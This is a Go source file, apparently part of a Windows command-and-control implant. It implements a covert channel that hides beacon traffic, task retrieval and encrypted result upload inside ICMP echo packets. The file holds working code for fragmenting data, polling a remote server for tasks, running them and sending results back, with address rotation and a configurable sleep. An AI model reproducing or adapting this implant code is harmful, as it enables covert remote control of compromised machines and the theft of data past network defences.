//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"errors"
	"gopher/utils"
	"syscall"
	"time"
	"unsafe"

	"github.com/vmihailenco/msgpack/v5"
)

// ICMP协议常量 - ICMP protocol constants
const (
	CUSTOM_HEADER_SIZE = 16
	TYPE_BEACON_DATA   = 0
	TYPE_REQUEST_REPLY = 1
	TYPE_ACK           = 2
	TYPE_TASK          = 3

	FRAGMENTED = 0x00000001
	FIRST_FRAG = 0x00000010
	LAST_FRAG  = 0x00000100
	FETCH_FRAG = 0x00001000
)

// ICMPHeader 自定义ICMP协议头
type ICMPHeader struct {
	Type          uint32
	Identifier    uint32
	Flags         uint32
	FragmentIndex uint32
}

// Windows ICMP API 结构
type IcmpEchoReply struct {
	Address       uint32
	Status        uint32
	RoundTripTime uint32
	DataSize      uint16
	Reserved      uint16
	Data          uintptr
	Options       uintptr
}

var (
	iphlpapi        = syscall.NewLazyDLL("iphlpapi.dll")
	ws2_32          = syscall.NewLazyDLL("ws2_32.dll")
	icmpCreateFile  = iphlpapi.NewProc("IcmpCreateFile")
	icmpSendEcho    = iphlpapi.NewProc("IcmpSendEcho")
	icmpCloseHandle = iphlpapi.NewProc("IcmpCloseHandle")
	inet_addr       = ws2_32.NewProc("inet_addr")
)

// ICMPConnection ICMP连接结构
type ICMPConnection struct {
	handle          syscall.Handle
	serverAddr      uint32
	identifier      uint32
	maxFragmentSize int
}

// NewICMPConnection 创建新的ICMP连接
func NewICMPConnection(serverAddr string, identifier uint32, maxFragmentSize int) (*ICMPConnection, error) {
	// 创建ICMP句柄
	ret, _, err := icmpCreateFile.Call()
	if ret == 0 || ret == uintptr(syscall.InvalidHandle) {
		return nil, err
	}

	// 转换IP地址
	addrBytes := append([]byte(serverAddr), 0)
	addrRet, _, _ := inet_addr.Call(uintptr(unsafe.Pointer(&addrBytes[0])))

	return &ICMPConnection{
		handle:          syscall.Handle(ret),
		serverAddr:      uint32(addrRet),
		identifier:      identifier,
		maxFragmentSize: maxFragmentSize,
	}, nil
}

// Close 关闭连接
func (ic *ICMPConnection) Close() error {
	if ic.handle != syscall.InvalidHandle {
		icmpCloseHandle.Call(uintptr(ic.handle))
		ic.handle = syscall.InvalidHandle
	}
	return nil
}

// SendData 发送数据（带分片支持）
func (ic *ICMPConnection) SendData(data []byte) error {
	maxPayload := ic.maxFragmentSize - CUSTOM_HEADER_SIZE

	if len(data) <= maxPayload {
		// 单包发送
		_, _, err := ic.sendPacket(TYPE_BEACON_DATA, 0, 0, data)
		return err
	}

	// 需要分片
	totalFrags := (len(data) + maxPayload - 1) / maxPayload

	for i := 0; i < totalFrags; i++ {
		start := i * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}

		var flags uint32 = FRAGMENTED
		if i == 0 {
			flags |= FIRST_FRAG
		}
		if i == totalFrags-1 {
			flags |= LAST_FRAG
		}

		// Windows IcmpSendEcho 是同步的，会等待响应（相当于等待ACK）
		_, _, err := ic.sendPacket(TYPE_BEACON_DATA, flags, uint32(i), data[start:end])
		if err != nil {
			return err
		}
	}

	return nil
}

// RequestResponse 请求并接收响应（支持分片重组）
func (ic *ICMPConnection) RequestResponse() ([]byte, error) {
	// 发送请求
	respHeader, payload, err := ic.sendPacket(TYPE_REQUEST_REPLY, 0, 0, nil)
	if err != nil {
		return nil, err
	}

	// 如果没有数据或不是TASK类型
	if respHeader == nil || respHeader.Type != TYPE_TASK {
		return nil, nil
	}

	// 检查是否需要分片重组
	if respHeader.Flags&FRAGMENTED == 0 {
		// 单包数据，直接返回
		return payload, nil
	}

	// 需要分片重组
	return ic.receiveFragmentedData(respHeader, payload)
}

// receiveFragmentedData 接收分片数据并重组
func (ic *ICMPConnection) receiveFragmentedData(firstHeader *ICMPHeader, firstPayload []byte) ([]byte, error) {
	var result []byte
	result = append(result, firstPayload...)

	// 如果第一个包就是最后一个分片
	if firstHeader.Flags&LAST_FRAG != 0 {
		return result, nil
	}

	fragIndex := uint32(1)

	for {
		// 请求下一个分片
		respHeader, payload, err := ic.sendPacket(TYPE_REQUEST_REPLY, FETCH_FRAG, fragIndex, nil)
		if err != nil {
			return nil, err
		}

		if respHeader == nil || respHeader.Type != TYPE_TASK {
			return nil, errors.New("unexpected response type during fragment reassembly")
		}

		result = append(result, payload...)

		// 检查是否是最后一个分片
		if respHeader.Flags&LAST_FRAG != 0 {
			break
		}

		fragIndex++

		// 防止无限循环
		if fragIndex > 1000 {
			return nil, errors.New("too many fragments")
		}
	}

	return result, nil
}

// sendPacket 发送单个ICMP包并接收响应
func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex uint32, payload []byte) (*ICMPHeader, []byte, error) {
	// 构建自定义协议头
	header := make([]byte, CUSTOM_HEADER_SIZE)
	binary.LittleEndian.PutUint32(header[0:4], packetType)
	binary.LittleEndian.PutUint32(header[4:8], ic.identifier)
	binary.LittleEndian.PutUint32(header[8:12], flags)
	binary.LittleEndian.PutUint32(header[12:16], fragIndex)

	sendData := append(header, payload...)

	// 准备接收缓冲区
	replySize := uint32(unsafe.Sizeof(IcmpEchoReply{})) + 65535
	replyBuf := make([]byte, replySize)

	// 发送ICMP Echo请求
	ret, _, err := icmpSendEcho.Call(
		uintptr(ic.handle),
		uintptr(ic.serverAddr),
		uintptr(unsafe.Pointer(&sendData[0])),
		uintptr(len(sendData)),
		0,
		uintptr(unsafe.Pointer(&replyBuf[0])),
		uintptr(replySize),
		uintptr(10000), // 10秒超时
	)

	if ret == 0 {
		return nil, nil, err
	}

	// 解析响应
	reply := (*IcmpEchoReply)(unsafe.Pointer(&replyBuf[0]))
	if reply.Status != 0 {
		return nil, nil, nil
	}

	if reply.DataSize < CUSTOM_HEADER_SIZE {
		return nil, nil, nil
	}

	// 获取响应数据
	replyData := make([]byte, reply.DataSize)
	for i := uint16(0); i < reply.DataSize; i++ {
		replyData[i] = *(*byte)(unsafe.Pointer(reply.Data + uintptr(i)))
	}

	respHeader := parseHeader(replyData[:CUSTOM_HEADER_SIZE])

	// 返回header和payload
	return &respHeader, replyData[CUSTOM_HEADER_SIZE:], nil
}

// parseHeader 解析协议头
func parseHeader(data []byte) ICMPHeader {
	return ICMPHeader{
		Type:          binary.LittleEndian.Uint32(data[0:4]),
		Identifier:    binary.LittleEndian.Uint32(data[4:8]),
		Flags:         binary.LittleEndian.Uint32(data[8:12]),
		FragmentIndex: binary.LittleEndian.Uint32(data[12:16]),
	}
}

// RunICMPLoop ICMP通信主循环
// 注意: prof 参数仅用于初始化，循环中使用全局 profile 以支持 sleep 命令动态修改
func RunICMPLoop(prof utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
	addrIndex := 0

	for i := 0; i < prof.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(prof.ConnTimeout) * time.Second)
			addrIndex = (addrIndex + 1) % len(prof.Addresses)
		}

		// 创建ICMP连接
		icmpConn, err := NewICMPConnection(prof.Addresses[addrIndex], agentId, prof.MaxFragmentSize)
		if err != nil {
			continue
		}

		// 发送初始化消息
		err = icmpConn.SendData(initMsg)
		if err != nil {
			icmpConn.Close()
			continue
		}

		i = 0 // 重置重连计数

		// 通信循环
		for ACTIVE {
			// 请求任务
			recvData, err := icmpConn.RequestResponse()
			if err != nil {
				break
			}

			if len(recvData) == 0 {
				// 使用全局 profile.SleepTime，支持 sleep 命令动态修改
				time.Sleep(time.Duration(profile.SleepTime) * time.Second)
				continue
			}

			var inMessage utils.Message

			// 解密接收的数据
			// Decrypt received data
			recvData, err = utils.DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			outMessage := utils.Message{Type: 0}
			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ := msgpack.Marshal(outMessage)
			// 加密发送的数据
			// Encrypt data before sending
			sendData, _ = utils.EncryptData(sendData, sessionKey)

			err = icmpConn.SendData(sendData)
			if err != nil {
				break
			}
		}

		icmpConn.Close()
	}
}
